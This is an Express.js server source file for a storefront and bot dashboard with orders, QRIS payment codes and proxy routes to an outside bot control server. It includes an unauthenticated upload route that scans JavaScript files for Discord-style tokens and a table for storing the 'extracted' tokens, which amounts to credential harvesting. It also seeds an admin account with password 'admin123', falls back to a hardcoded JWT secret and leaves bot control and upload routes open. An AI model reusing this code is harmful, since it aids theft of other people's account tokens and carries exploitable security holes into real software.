const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const https = require('https');
const sqlite3 = require('sqlite3').verbose();
const { Octokit } = require('@octokit/rest');
const QRCode = require('qrcode');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');

const app = express();
const PORT = process.env.PORT || 3000;

// Database setup
const db = new sqlite3.Database('./database/vanilla.db');

// Initialize database tables
db.serialize(() => {
    // Products table
    db.run(`CREATE TABLE IF NOT EXISTS products (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL,
        description TEXT,
        price REAL,
        category TEXT,
        image_url TEXT,
        file_url TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Orders table
    db.run(`CREATE TABLE IF NOT EXISTS orders (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        product_id INTEGER,
        customer_email TEXT,
        amount REAL,
        payment_method TEXT,
        status TEXT DEFAULT 'pending',
        payment_proof TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (product_id) REFERENCES products(id)
    )`);

    // Users/Admin table
    db.run(`CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT,
        is_admin BOOLEAN DEFAULT 0,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Tokens table
    db.run(`CREATE TABLE IF NOT EXISTS tokens (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        token TEXT UNIQUE,
        platform TEXT,
        source TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Bots table
    db.run(`CREATE TABLE IF NOT EXISTS bots (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT,
        status TEXT,
        last_online DATETIME,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )`);

    // Create default admin user
    const defaultPassword = bcrypt.hashSync('admin123', 10);
    db.run(`INSERT OR IGNORE INTO users (username, password, is_admin) VALUES (?, ?, ?)`,
        ['admin', defaultPassword, 1]);
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));
app.use('/uploads', express.static('uploads'));

// Multer configuration for file uploads
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        const dir = 'uploads/';
        if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
        cb(null, dir);
    },
    filename: (req, file, cb) => {
        cb(null, Date.now() + '-' + file.originalname);
    }
});

const upload = multer({ storage });

// Bot Control API Integration
const BOT_API_URL = 'https://bot-control-server-production.up.railway.app';

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    
    if (!token) return res.status(401).json({ error: 'Access denied' });

    jwt.verify(token, process.env.JWT_SECRET || 'vanilla-secret-key', (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// Admin middleware
const isAdmin = (req, res, next) => {
    if (!req.user || !req.user.isAdmin) {
        return res.status(403).json({ error: 'Admin access required' });
    }
    next();
};

// ==================== AUTHENTICATION ENDPOINTS ====================

app.post('/api/login', async (req, res) => {
    const { username, password } = req.body;
    
    db.get('SELECT * FROM users WHERE username = ?', [username], async (err, user) => {
        if (err || !user) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }
        
        const token = jwt.sign(
            { userId: user.id, username: user.username, isAdmin: user.is_admin },
            process.env.JWT_SECRET || 'vanilla-secret-key',
            { expiresIn: '24h' }
        );
        
        res.json({ token, user: { username: user.username, isAdmin: user.is_admin } });
    });
});

// ==================== PRODUCTS ENDPOINTS ====================

// Get all products
app.get('/api/products', (req, res) => {
    db.all('SELECT * FROM products ORDER BY created_at DESC', (err, products) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(products);
    });
});

// Get single product
app.get('/api/products/:id', (req, res) => {
    db.get('SELECT * FROM products WHERE id = ?', [req.params.id], (err, product) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        if (!product) {
            return res.status(404).json({ error: 'Product not found' });
        }
        res.json(product);
    });
});

// Create product (Admin only)
app.post('/api/products', authenticateToken, isAdmin, upload.single('image'), (req, res) => {
    const { name, description, price, category } = req.body;
    const image_url = req.file ? `/uploads/${req.file.filename}` : null;
    
    db.run(
        `INSERT INTO products (name, description, price, category, image_url) VALUES (?, ?, ?, ?, ?)`,
        [name, description, parseFloat(price), category, image_url],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ id: this.lastID, message: 'Product created successfully' });
        }
    );
});

// Update product (Admin only)
app.put('/api/products/:id', authenticateToken, isAdmin, upload.single('image'), (req, res) => {
    const { name, description, price, category } = req.body;
    const productId = req.params.id;
    
    let image_url = null;
    if (req.file) {
        image_url = `/uploads/${req.file.filename}`;
    }
    
    let query = `UPDATE products SET name = ?, description = ?, price = ?, category = ?`;
    let params = [name, description, parseFloat(price), category];
    
    if (image_url) {
        query += `, image_url = ?`;
        params.push(image_url);
    }
    
    query += `, updated_at = CURRENT_TIMESTAMP WHERE id = ?`;
    params.push(productId);
    
    db.run(query, params, function(err) {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json({ message: 'Product updated successfully' });
    });
});

// Delete product (Admin only)
app.delete('/api/products/:id', authenticateToken, isAdmin, (req, res) => {
    db.run('DELETE FROM products WHERE id = ?', [req.params.id], function(err) {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json({ message: 'Product deleted successfully' });
    });
});

// ==================== ORDERS ENDPOINTS ====================

// Create order
app.post('/api/orders', upload.single('payment_proof'), (req, res) => {
    const { product_id, customer_email, amount, payment_method } = req.body;
    const payment_proof = req.file ? `/uploads/${req.file.filename}` : null;
    
    db.run(
        `INSERT INTO orders (product_id, customer_email, amount, payment_method, payment_proof) VALUES (?, ?, ?, ?, ?)`,
        [product_id, customer_email, parseFloat(amount), payment_method, payment_proof],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ 
                id: this.lastID, 
                message: 'Order created successfully',
                status: 'pending'
            });
        }
    );
});

// Get all orders (Admin only)
app.get('/api/orders', authenticateToken, isAdmin, (req, res) => {
    db.all(`
        SELECT o.*, p.name as product_name 
        FROM orders o 
        LEFT JOIN products p ON o.product_id = p.id 
        ORDER BY o.created_at DESC
    `, (err, orders) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(orders);
    });
});

// Update order status (Admin only)
app.put('/api/orders/:id/status', authenticateToken, isAdmin, (req, res) => {
    const { status } = req.body;
    
    db.run(
        `UPDATE orders SET status = ? WHERE id = ?`,
        [status, req.params.id],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ message: 'Order status updated successfully' });
        }
    );
});

// ==================== BOT CONTROL ENDPOINTS ====================

// Proxy to bot control server
app.get('/api/bots', async (req, res) => {
    try {
        const response = await fetch(`${BOT_API_URL}/bots`);
        const data = await response.json();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch bots' });
    }
});

app.post('/api/bots/start', async (req, res) => {
    try {
        const response = await fetch(`${BOT_API_URL}/start`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(req.body)
        });
        const data = await response.json();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to start bot' });
    }
});

app.post('/api/bots/stop', async (req, res) => {
    try {
        const response = await fetch(`${BOT_API_URL}/stop`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(req.body)
        });
        const data = await response.json();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to stop bot' });
    }
});

app.get('/api/bots/logs', async (req, res) => {
    try {
        const response = await fetch(`${BOT_API_URL}/logs`);
        const data = await response.json();
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: 'Failed to fetch logs' });
    }
});

// ==================== DEPLOYMENT ENDPOINTS ====================

// GitHub deployment endpoint
app.post('/api/deploy/github', authenticateToken, async (req, res) => {
    const { repo, branch, token } = req.body;
    
    try {
        const octokit = new Octokit({ auth: token });
        
        // Get repository info
        const [owner, repoName] = repo.split('/');
        const repoInfo = await octokit.repos.get({ owner, repo: repoName });
        
        // Simulate deployment process
        const deployment = {
            id: Date.now(),
            repo: repo,
            branch: branch,
            status: 'deploying',
            url: `https://${repoName}-${owner}.vercel.app`,
            createdAt: new Date().toISOString()
        };
        
        // Simulate build process
        setTimeout(() => {
            deployment.status = 'success';
            // In production, you would integrate with Vercel/Railway API here
        }, 3000);
        
        res.json({
            message: 'Deployment initiated',
            deployment,
            vercelUrl: `https://vercel.com/new?repository-url=https://github.com/${repo}`
        });
    } catch (error) {
        res.status(500).json({ error: 'GitHub deployment failed', details: error.message });
    }
});

// ==================== QRIS PAYMENT ENDPOINT ====================

app.post('/api/payment/qris', async (req, res) => {
    const { amount, order_id } = req.body;
    
    try {
        // Generate QR code data (in production, use real payment gateway)
        const qrData = `https://vanilla.biz.id/payment/confirm?order=${order_id}&amount=${amount}`;
        const qrCode = await QRCode.toDataURL(qrData);
        
        res.json({
            qr_code: qrCode,
            amount: amount,
            order_id: order_id,
            instructions: 'Scan QRIS dengan aplikasi bank/e-wallet Anda'
        });
    } catch (error) {
        res.status(500).json({ error: 'Failed to generate QRIS' });
    }
});

// ==================== TOKEN MANAGEMENT ====================

// Save extracted token
app.post('/api/tokens', authenticateToken, (req, res) => {
    const { token, platform, source } = req.body;
    
    db.run(
        `INSERT INTO tokens (token, platform, source) VALUES (?, ?, ?)`,
        [token, platform, source],
        function(err) {
            if (err) {
                return res.status(500).json({ error: err.message });
            }
            res.json({ id: this.lastID, message: 'Token saved' });
        }
    );
});

// Get all tokens
app.get('/api/tokens', authenticateToken, (req, res) => {
    db.all('SELECT * FROM tokens ORDER BY created_at DESC', (err, tokens) => {
        if (err) {
            return res.status(500).json({ error: err.message });
        }
        res.json(tokens);
    });
});

// ==================== FILE UPLOAD ====================

app.post('/api/upload', upload.array('files', 10), (req, res) => {
    const files = req.files.map(file => ({
        filename: file.filename,
        originalname: file.originalname,
        size: file.size,
        path: `/uploads/${file.filename}`
    }));
    
    // Extract tokens from uploaded files
    const extractedTokens = [];
    req.files.forEach(file => {
        if (file.mimetype === 'text/javascript' || file.originalname.endsWith('.js')) {
            const content = fs.readFileSync(file.path, 'utf8');
            const tokenRegex = /[A-Za-z0-9_-]{24}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}/g;
            const tokens = content.match(tokenRegex);
            if (tokens) {
                extractedTokens.push(...tokens);
            }
        }
    });
    
    res.json({
        message: 'Files uploaded successfully',
        files: files,
        tokens: extractedTokens
    });
});

// ==================== STATISTICS ====================

app.get('/api/stats', (req, res) => {
    db.get('SELECT COUNT(*) as total_products FROM products', (err, prodResult) => {
        db.get('SELECT COUNT(*) as total_orders FROM orders', (err, orderResult) => {
            db.get('SELECT COUNT(*) as total_tokens FROM tokens', (err, tokenResult) => {
                res.json({
                    products: prodResult.total_products,
                    orders: orderResult.total_orders,
                    tokens: tokenResult.total_tokens,
                    bot_api_status: 'connected',
                    server_time: new Date().toISOString()
                });
            });
        });
    });
});

// ==================== SERVE FRONTEND PAGES ====================

app.get('/store', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'store.html'));
});

app.get('/deploy-web', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'deploy-web.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Start server
app.listen(PORT, () => {
    console.log(`Vanilla Ecosystem running on port ${PORT}`);
    console.log(`Dashboard: http://localhost:${PORT}`);
    console.log(`Store: http://localhost:${PORT}/store`);
    console.log(`Deploy Web: http://localhost:${PORT}/deploy-web`);
    console.log(`Admin: http://localhost:${PORT}/admin`);
});